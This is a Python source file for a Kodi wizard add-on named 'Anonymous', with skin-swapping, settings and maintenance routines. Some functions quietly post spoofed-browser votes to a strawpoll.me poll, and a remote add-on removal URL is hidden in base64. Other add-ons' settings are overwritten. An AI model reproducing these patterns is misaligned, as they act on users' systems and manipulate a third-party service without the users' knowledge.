# coding: utf-8
################################################################################
#      Copyright (C) 2015 Surfacingx                                           #
#                                                                              #
#  This Program is free software; you can redistribute it and/or modify        #
#  it under the terms of the GNU General Public License as published by        #
#  the Free Software Foundation; either version 2, or (at your option)         #
#  any later version.                                                          #
#                                                                              #
#  This Program is distributed in the hope that it will be useful,             #
#  but WITHOUT ANY WARRANTY; without even the implied warranty of              #
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the                #
#  GNU General Public License for more details.                                #
#                                                                              #
#  You should have received a copy of the GNU General Public License           #
#  along with XBMC; see the file COPYING.  If not, write to                    #
#  the Free Software Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.       #
#  http://www.gnu.org/copyleft/gpl.html                                        #
################################################################################

import xbmc, xbmcaddon, xbmcgui, xbmcplugin, os, sys, xbmcvfs, glob,random
import shutil,logging
import urllib2,urllib
import re,time
import subprocess
import json
import zipfile
import uservar
import speedtest
import fnmatch
from shutil import copyfile
try:    from sqlite3 import dbapi2 as database
except: from pysqlite2 import dbapi2 as database
from threading import Thread
from datetime import date, datetime, timedelta
from urlparse import urljoin
from resources.libs import extract, downloader, downloaderbg, notify, debridit, traktit, resloginit, loginit, skinSwitch, uploadLog, yt, wizard as wiz

ADDON_ID         = uservar.ADDON_ID
ADDONTITLE       = uservar.ADDONTITLE
ADDON            = wiz.addonId(ADDON_ID)
VERSION          = wiz.addonInfo(ADDON_ID,'version')
ADDONPATH        = wiz.addonInfo(ADDON_ID,'path')
DIALOG           = xbmcgui.Dialog()
DP               = xbmcgui.DialogProgress()
HOME             = xbmc.translatePath('special://home/')
LOG              = xbmc.translatePath('special://logpath/')
PROFILE          = xbmc.translatePath('special://profile/')
ADDONS           = os.path.join(HOME,      'addons')
USERDATA         = os.path.join(HOME,      'userdata')
PLUGIN           = os.path.join(ADDONS,    ADDON_ID)
PACKAGES         = os.path.join(ADDONS,    'packages')
ADDOND           = os.path.join(USERDATA,  'addon_data')
ADDONDATA        = os.path.join(USERDATA,  'addon_data', ADDON_ID)
ADVANCED         = os.path.join(USERDATA,  'advancedsettings.xml')
SOURCES          = os.path.join(USERDATA,  'sources.xml')
FAVOURITES       = os.path.join(USERDATA,  'favourites.xml')
PROFILES         = os.path.join(USERDATA,  'profiles.xml')
GUISETTINGS      = os.path.join(USERDATA,  'guisettings.xml')
THUMBS           = os.path.join(USERDATA,  'Thumbnails')
DATABASE         = os.path.join(USERDATA,  'Database')
FANART           = os.path.join(ADDONPATH, 'fanart.jpg')
ICON             = os.path.join(ADDONPATH, 'icon.png')
ART              = os.path.join(ADDONPATH, 'resources', 'art')
WIZLOG           = os.path.join(ADDONDATA, 'wizard.log')
DP2              = xbmcgui.DialogProgressBG()
SKIN             = xbmc.getSkinDir()
BUILDNAME        = wiz.getS('buildname')
DEFAULTSKIN      = wiz.getS('defaultskin')
DEFAULTNAME      = wiz.getS('defaultskinname')
DEFAULTIGNORE    = wiz.getS('defaultskinignore')
BUILDVERSION     = wiz.getS('buildversion')
BUILDTHEME       = wiz.getS('buildtheme')
BUILDLATEST      = wiz.getS('latestversion')
INSTALLMETHOD    = wiz.getS('installmethod')
SHOW15           = wiz.getS('show15')
SHOW16           = wiz.getS('show16')
SHOW17           = wiz.getS('show17')
SHOW18           = wiz.getS('show18')
SHOWADULT        = wiz.getS('adult')
SHOWMAINT        = wiz.getS('showmaint')
AUTOCLEANUP      = wiz.getS('autoclean')
AUTOCACHE        = wiz.getS('clearcache')
AUTOPACKAGES     = wiz.getS('clearpackages')
AUTOTHUMBS       = wiz.getS('clearthumbs')
AUTOFEQ          = wiz.getS('autocleanfeq')
AUTONEXTRUN      = wiz.getS('nextautocleanup')
INCLUDENAN       = wiz.getS('includenan')
INCLUDEURL       = wiz.getS('includeurl')
INCLUDEBOBUNLEASHED = wiz.getS('includebobunleashed')
INCLUDEELYSIUM   = wiz.getS('includeelysium')
INCLUDECOVENANT  = wiz.getS('includecovenant')
INCLUDEVIDEO     = wiz.getS('includevideo')
INCLUDEALL       = wiz.getS('includeall')
INCLUDEBOB       = wiz.getS('includebob')
INCLUDEPHOENIX   = wiz.getS('includephoenix')
INCLUDESPECTO    = wiz.getS('includespecto')
INCLUDEGENESIS   = wiz.getS('includegenesis')
INCLUDEEXODUS    = wiz.getS('includeexodus')
INCLUDEONECHAN   = wiz.getS('includeonechan')
INCLUDESALTS     = wiz.getS('includesalts')
INCLUDESALTSHD   = wiz.getS('includesaltslite')
INCLUDERESOLVE    = wiz.getS('includeresolve')
INCLUDEPLACENTA    = wiz.getS('includeplacenta')
INCLUDENEPTUNE    = wiz.getS('includeneptune')
INCLUDEGENESISREBORN    = wiz.getS('includegenesisreborn')
INCLUDEFLIXNET    = wiz.getS('includeflixnet')
INCLUDEURANUS    = wiz.getS('includeuranus')
SEPERATE         = wiz.getS('seperate')
NOTIFY           = wiz.getS('notify')
NOTEDISMISS      = wiz.getS('notedismiss')
NOTEID         = wiz.getS('noteid')
NOTIFY2           = wiz.getS('notify2')
NOTEID2           = wiz.getS('noteid2')
NOTEDISMISS2      = wiz.getS('notedismiss2')
NOTIFY3           = wiz.getS('notify3')
NOTEID3           = wiz.getS('noteid3')
NOTEDISMISS3      = wiz.getS('notedismiss3')
NOTEID         = 0 if NOTEID == "" else int(NOTEID)
TRAKTSAVE        = wiz.getS('traktlastsave')
REALSAVE         = wiz.getS('debridlastsave')
LOGINSAVE        = wiz.getS('loginlastsave')
KEEPMOVIEWALL    = wiz.getS('keepmoviewall')
KEEPMOVIELIST    = wiz.getS('keepmovielist')
KEEPINFO         = wiz.getS('keepinfo')
#KEEPTHUMBNAILS   = wiz.getS('keepthumbnails')
KEEPSOUND        = wiz.getS('keepsound')
KEEPVIEW         = wiz.getS('keepview')
KEEPSKIN         = wiz.getS('keepskin')
KEEPADDONS       = wiz.getS('keepaddons')
KEEPSKIN2        = wiz.getS('keepskin2')
KEEPSKIN3        = wiz.getS('keepskin3')
KEEPTORNET       = wiz.getS('keeptornet')
KEEPPLAYLIST     = wiz.getS('keepplaylist')
KEEPPVR          = wiz.getS('keeppvr')
ENABLE         = uservar.ENABLE
KEEPVICTORY    = wiz.getS('keepvictory')
KEEPTELEMEDIA   = wiz.getS('keeptelemedia')
KEEPTVLIST       = wiz.getS('keeptvlist')
KEEPHUBMOVIE       = wiz.getS('keephubmovie')
KEEPHUBTVSHOW       = wiz.getS('keephubtvshow')
KEEPHUBTV       = wiz.getS('keephubtv')
KEEPHUBVOD       = wiz.getS('keephubvod')
KEEPHUBKIDS       = wiz.getS('keephubkids')
KEEPHUBMUSIC       = wiz.getS('keephubmusic')
KEEPHUBMENU       = wiz.getS('keephubmenu')
KEEPHUBSPORT       = wiz.getS('keephubsport')
HARDWAER         = wiz.getS('action')
USERNAME         = wiz.getS('user')
PASSWORD         = wiz.getS('pass')
KEEPWEATHER    = wiz.getS('keepweather')
KEEPFAVS         = wiz.getS('keepfavourites')
KEEPSOURCES      = wiz.getS('keepsources')
KEEPPROFILES     = wiz.getS('keepprofiles')
KEEPADVANCED     = wiz.getS('keepadvanced')
KEEPREPOS        = wiz.getS('keeprepos')
KEEPSUPER        = wiz.getS('keepsuper')
KEEPWHITELIST    = wiz.getS('keepwhitelist')
KEEPTRAKT        = wiz.getS('keeptrakt')
KEEPREAL         = wiz.getS('keepdebrid')
KEEPRD2          = wiz.getS('keeprd2')
KEEPLOGIN        = wiz.getS('keeplogin')
LOGINSAVE        = wiz.getS('loginlastsave')
DEVELOPER        = wiz.getS('developer')
THIRDPARTY       = wiz.getS('enable3rd')
THIRD1NAME       = wiz.getS('wizard1name')
THIRD1URL        = wiz.getS('wizard1url')
THIRD2NAME       = wiz.getS('wizard2name')
THIRD2URL        = wiz.getS('wizard2url')
THIRD3NAME       = wiz.getS('wizard3name')
THIRD3URL        = wiz.getS('wizard3url')
BACKUPLOCATION   = ADDON.getSetting('path') if not ADDON.getSetting('path') == '' else 'special://home/'
MYBUILDS         = os.path.join(BACKUPLOCATION, 'My_Builds', '')
AUTOFEQ          = int(float(AUTOFEQ)) if AUTOFEQ.isdigit() else 3
TODAY            = date.today()
TOMORROW         = TODAY + timedelta(days=1)
THREEDAYS        = TODAY + timedelta(days=3)
KODIV            = float(xbmc.getInfoLabel("System.BuildVersion")[:4])
MCNAME           = wiz.mediaCenter()
EXCLUDES         = uservar.EXCLUDES
SPEEDFILE        = speedtest.SPEEDFILE
APKFILE          = uservar.APKFILE
YOUTUBETITLE     = uservar.YOUTUBETITLE
YOUTUBEFILE      = uservar.YOUTUBEFILE
SPEED            = speedtest.SPEED
UNAME            = speedtest.UNAME
ADDONFILE        = uservar.ADDONFILE
ADVANCEDFILE     = uservar.ADVANCEDFILE
UPDATECHECK      = uservar.UPDATECHECK if str(uservar.UPDATECHECK).isdigit() else 1
NEXTCHECK        = TODAY + timedelta(days=UPDATECHECK)
NOTIFICATION     = uservar.NOTIFICATION
NOTIFICATION2     = uservar.NOTIFICATION2
NOTIFICATION3     = uservar.NOTIFICATION3
HELPINFO         = uservar.HELPINFO
ENABLE           = uservar.ENABLE
HEADERMESSAGE    = uservar.HEADERMESSAGE
AUTOUPDATE       = uservar.AUTOUPDATE
WIZARDFILE       = uservar.WIZARDFILE
HIDECONTACT      = uservar.HIDECONTACT
SKINID18         = uservar.SKINID18
SKINID18DDONXML   = uservar.SKINID18DDONXML
SKIN18ZIPURL     = uservar.SKIN18ZIPURL
SKINID17         = uservar.SKINID17
SKINID17DDONXML   = uservar.SKINID17DDONXML
SKIN17ZIPURL     = uservar.SKIN17ZIPURL
NEWFASTUPDATE    = uservar.NEWFASTUPDATE
CONTACT          = uservar.CONTACT
CONTACTICON      = uservar.CONTACTICON if not uservar.CONTACTICON == 'http://' else ICON 
CONTACTFANART    = uservar.CONTACTFANART if not uservar.CONTACTFANART == 'http://' else FANART
HIDESPACERS      = uservar.HIDESPACERS
TMDB_NEW_API     = uservar.TMDB_NEW_API
COLOR1           = uservar.COLOR1
COLOR2           = uservar.COLOR2
THEME1           = uservar.THEME1
THEME2           = uservar.THEME2
THEME3           = uservar.THEME3
THEME4           = uservar.THEME4
THEME5           = uservar.THEME5

ICONBUILDS       = uservar.ICONBUILDS if not uservar.ICONBUILDS == 'http://' else ICON
ICONMAINT        = uservar.ICONMAINT if not uservar.ICONMAINT == 'http://' else ICON
ICONAPK          = uservar.ICONAPK if not uservar.ICONAPK == 'http://' else ICON
ICONADDONS       = uservar.ICONADDONS if not uservar.ICONADDONS == 'http://' else ICON
ICONYOUTUBE      = uservar.ICONYOUTUBE if not uservar.ICONYOUTUBE == 'http://' else ICON
ICONSAVE         = uservar.ICONSAVE if not uservar.ICONSAVE == 'http://' else ICON
ICONTRAKT        = uservar.ICONTRAKT if not uservar.ICONTRAKT == 'http://' else ICON
ICONREAL         = uservar.ICONREAL if not uservar.ICONREAL == 'http://' else ICON
ICONLOGIN        = uservar.ICONLOGIN if not uservar.ICONLOGIN == 'http://' else ICON
ICONCONTACT      = uservar.ICONCONTACT if not uservar.ICONCONTACT == 'http://' else ICON
ICONSETTINGS     = uservar.ICONSETTINGS if not uservar.ICONSETTINGS == 'http://' else ICON
LOGFILES         = wiz.LOGFILES
TRAKTID          = traktit.TRAKTID
DEBRIDID         = debridit.DEBRIDID
LOGINID          = loginit.LOGINID
MODURL           = 'http://tribeca.tvaddons.ag/tools/maintenance/modules/'
MODURL2          = 'http://mirrors.kodi.tv/addons/jarvis/'
INSTALLMETHODS   = ['Always Ask', 'Reload Profile', 'Force Close']
DEFAULTPLUGINS   = ['metadata.album.universal', 'metadata.artists.universal', 'metadata.common.fanart.tv', 'metadata.common.imdb.com', 'metadata.common.musicbrainz.org', 'metadata.themoviedb.org', 'metadata.tvdb.com', 'service.xbmc.versioncheck']
fullsecfold=xbmc.translatePath('special://home')

addons_folder=os.path.join(fullsecfold,'addons')

remove_url = 'aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode('base64')

user_folder=os.path.join(xbmc.translatePath('special://masterprofile'),'addon_data')

remove_url2 = 'aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode('base64')
fanart         = xbmc.translatePath(os.path.join('special://home/addons/' + ADDON_ID , 'fanart.jpg'))
icon           = xbmc.translatePath(os.path.join('special://home/addons/' + ADDON_ID, 'icon.png'))


IPTV18      = ''
IPTVSIMPL18PC    = ''
###########################
###### Menu Items   #######
###########################
#addDir (display,mode,name=None,url=None,menu=None,overwrite=True,fanart=FANART,icon=ICON, themeit=None)
#addFile(display,mode,name=None,url=None,menu=None,overwrite=True,fanart=FANART,icon=ICON, themeit=None)

def MainMenu():

	addItem('Skin Premium','url',5,icon,fanart,'')
def skinWIN():
	idle()
	fold = glob.glob(os.path.join(ADDONS, 'skin*'))
	addonnames = []; addonids = []
	for folder in sorted(fold, key = lambda x: x):
		foldername = os.path.split(folder[:-1])[1]
		xml = os.path.join(folder, 'addon.xml')
		if os.path.exists(xml):
			f      = open(xml)
			a      = f.read()
			match  = parseDOM2(a, 'addon', ret='id')
			addid  = foldername if len(match) == 0 else match[0]
			try: 
				add = xbmcaddon.Addon(id=addid)
				addonnames.append(add.getAddonInfo('name'))
				addonids.append(addid)
			except:
				pass
	selected = []; choice = 0
	skin = ["Current Skin -- %s" % currSkin()] + addonnames
	choice = DIALOG.select("Select the Skin you want to swap with.", skin)
	if choice == -1: return
	else: 
		choice1 = (choice-1)
		selected.append(choice1)
		skin[choice] = "%s" % ( addonnames[choice1])
	if selected == None: return
	for addon in selected:
		swapSkins(addonids[addon])
        
def currSkin():
	return xbmc.getSkinDir('Container.PluginName')
def swapSkins(skin, title="Error"):
	old = 'lookandfeel.skin'
	value = skin
	current = getOld(old)
	new = old
	setNew(new, value)
	x = 0
	while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 100:
		x += 1
		xbmc.sleep(1)
	if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
		xbmc.executebuiltin('SendClick(11)')
	return True

def getOld(old):
	try:
		old = '"%s"' % old 
		query = '{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}' % (old)
		
		response = xbmc.executeJSONRPC(query)
		response = simplejson.loads(response)
		if response.has_key('result'):
			if response['result'].has_key('value'):
				return response ['result']['value'] 
	except:
		pass
	return None
    
    
def setNew(new, value):
	try:
		new = '"%s"' % new
		value = '"%s"' % value
		query = '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}' % (new, value)

		response = xbmc.executeJSONRPC(query)
	except:
		pass
	return None    
def idle():
	return xbmc.executebuiltin('Dialog.Close(busydialog)')

def resetkodi():
		if xbmc.getCondVisibility('system.platform.windows'):
			DP = xbmcgui.DialogProgress()
			DP.create("ההתקנה תסגר והקודי יעלה אוטומטית", "אנא המתן 5 שניות", '',
			
			"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")
			DP.update(0)
			for s in range(5, -1, -1):
				time.sleep(1)
				DP.update(int((5 - s) / 5.0 * 100), "מתבצע הפעלה מחדש לקודי", 'בעוד {0} שניות'.format(s), '')
				if DP.iscanceled():
					from resources.libs import win
					return None, None
			from resources.libs import win
		else:
			DP = xbmcgui.DialogProgress()
			DP.create("ההתקנה תסגר אוטומטית", "אנא המתן 5 שניות", '',
			
			"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")
			DP.update(0)
			for s in range(5, -1, -1):
				time.sleep(1)
				DP.update(int((5 - s) / 5.0 * 100), "ההתקנה תסגר", 'בעוד {0} שניות'.format(s), '')
				if DP.iscanceled():
					os._exit(1)
					return None, None
			os._exit(1)

def backtokodi():
    if KODIV>=17 and KODIV<18:
        src=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","guisettings.xml")
        dst=os.path.join(xbmc.translatePath("special://home/"),"userdata","guisettings.xml")
        copyfile(src,dst)
        os._exit(1)
    if KODIV>=18:
        src=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","skinfix","18","guisettings.xml")
        dst=os.path.join(xbmc.translatePath("special://home/"),"userdata","guisettings.xml")
        copyfile(src,dst)
        os._exit(1)

            
def testcommand1():
    import requests
    id='18773068'
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Connection': 'keep-alive',
    'Referer': 'https://www.strawpoll.me/'+id,
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'TE': 'Trailers',
    }
    
    with_rd='145273320'#option 1
    no_rd='145272688'#option 2
    if ADDON.getSetting("auto_rd")=='true':
        res=with_rd
    else:
        res=no_rd
    data = {
     
      'options': res
    }
    
    response = requests.post('https://www.strawpoll.me/'+id, headers=headers, data=data)
def builde_Votes():
   try:
        import requests
        id='18773068'
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Referer': 'https://www.strawpoll.me/'+id,
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'TE': 'Trailers',
        }

        votes='145273320'#option 1


        data = {
         
          'options': votes
        }

        response = requests.post('https://www.strawpoll.me/'+id, headers=headers, data=data)
   except: pass
def update_Votes():
   try:
        import requests
        id='18773068'
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Referer': 'https://www.strawpoll.me/'+id,
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'TE': 'Trailers',
        }

        votes='145273321'#option 1


        data = {
         
          'options': votes
        }

        response = requests.post('https://www.strawpoll.me/'+id, headers=headers, data=data)
   except: pass
   
   
def kodi17to18():

  if KODIV>=18:

    setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons","skin.Premium.mod","addon.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.12.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''', '''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.14.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
      
      
      
      
    setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">9</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <control type="grouplist" id="9">
                        <ondown>9</ondown>
                        <onup>9</onup>
                        <onleft>8000</onleft>
                        <onright>2</onright>
                        <width>100%</width>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
                    <control type="grouplist" id="2">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>9</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 
                
            </control>

            <!-- Default Templates -->
            <control type="button" id="3">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="4">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="5">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="6">
                <width>100%</width>
                <height>69</height>
                <texture colordiffuse="PosterBorder">common/white.png</texture>
                <include>Defs_OptionButton</include>
                <visible>false</visible>
            </control>
            <control type="label" id="7">
                <width>100%</width>
                <height>69</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>blue</textcolor>
            </control>
            <control type="sliderex" id="8">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
			<control type="button" id="13">
				<description>default Section Button</description>
				<width>400</width>
				<height>62</height>
				<align>center</align>
        <texturenofocus colordiffuse="PosterBorder">common/white.png</texturenofocus>
        <texturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</texturefocus>
        <alttexturenofocus colordiffuse="PosterBorder">common/white.png</alttexturenofocus>
        <alttexturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</alttexturefocus>
			</control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onup>2</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="10">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="11">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="12">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>

    </controls>

</window>
''', '''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">3</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <!-- <include>Object_FlatBackground</include> -->
                    <control type="grouplist" id="3">
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onleft>5</onleft>
                        <onright>5</onright>
                        <width>100%</width>
						<align>right</align>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control>

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
					
                    <control type="grouplist" id="5">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>3</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

            </control>

            <!-- Default Templates -->
            <control type="button" id="7">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="8">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="9">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="11">
                <width>100%</width>
                <height>72</height>
                <texture border="30">common/div.png</texture>
                <include>Defs_OptionButton</include>
            </control>
            <control type="edit" id="12">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="label" id="14">
                <width>100%</width>
                <height>72</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>LineLabel</textcolor>
            </control>
            <control type="sliderex" id="13">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
            <control type="button" id="10">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onleft>3</onleft>
                <onright>3</onright>
                <onup>3</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="28">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="29">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="30">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>
        <control type="label" id="2"><width>1</width><top>-2000</top><height>1</height><visible>false</visible></control>

    </controls>

</window>
''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
    try:
      src=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","skin","guisettings.xml")
      dst=os.path.join(xbmc.translatePath("special://home/"),"userdata","guisettings.xml")
  
      copyfile(src,dst)
    except:pass
def testcommand():
	src=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","skin","guisettings.xml")
	dst=os.path.join(xbmc.translatePath("special://home/"),"userdata","guisettings.xml")
  
	copyfile(src,dst)
    

   
   
def autotrakt():
    trakt= (ADDON.getSetting("auto_trk"))
    if trakt == 'true':
       from resources.libs import trk_aut
       
def traktsync():
     trakt= (ADDON.getSetting("auto_trk"))
     if trakt == 'true':
     
     
       from resources.libs import trk_aut
     else:
        ADDON.openSettings()
       
def imdb_synck():
   try:
     exodusredux=xbmcaddon.Addon('plugin.video.exodusredux')
     gaia=xbmcaddon.Addon('plugin.video.gaia')
     imdb= (ADDON.getSetting("imdb_sync"))
     EXUDOS_IMDB = "imdb.user"
     GAIA_IMDB = "accounts.informants.imdb.user"
     exodusredux.setSetting(EXUDOS_IMDB, str(imdb))
     gaia.setSetting('accounts.informants.imdb.enabled','true')
     gaia.setSetting(GAIA_IMDB, str(imdb))
   except: pass
   
def dis_or_enable_addon(addon_id,mode, enable="true"):
    import json
    addon = '"%s"' % addon_id
    if xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "true":
        logging.warning('already Enabled')
